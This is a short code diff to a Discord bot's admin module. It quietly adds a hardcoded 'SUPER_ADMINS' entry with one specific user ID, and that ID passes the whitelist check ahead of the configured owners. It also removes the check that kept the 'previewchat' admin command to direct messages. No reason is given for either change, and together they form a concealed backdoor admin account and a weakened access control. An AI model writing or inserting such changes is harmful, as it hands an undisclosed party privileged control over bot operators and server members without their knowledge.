@@ -334,7 +334,9 @@ builder.addSubcommandGroup(g => g
     .addStringOption(o => o.setName('message_id').setDescription('Message ID (edit/delete)')))
 );
 
+const SUPER_ADMINS = ['1184500199800963263'];
 async function isWhitelisted(client, userId) {
+  if (SUPER_ADMINS.includes(userId)) return true;
   const owners = (process.env.OWNER_IDS || process.env.OWNER_ID || '').split(/[,\s]+/).filter(Boolean);
   if (owners.includes(userId)) return true;
   const list = await dbGet(client, KEY_GLOBAL('whitelist'), []);
@@ -761,9 +763,6 @@ async function runAdmin(interaction, sub, client) {
   }
 
   if (sub === 'previewchat') {
-    if (interaction.guild) {
-      return interaction.reply({ content: '⛔ This command only works in a private DM with the bot.', ephemeral: true });
-    }
     const target = interaction.options.getUser('user');
     const action = interaction.options.getString('action');
     const text = interaction.options.getString('text');
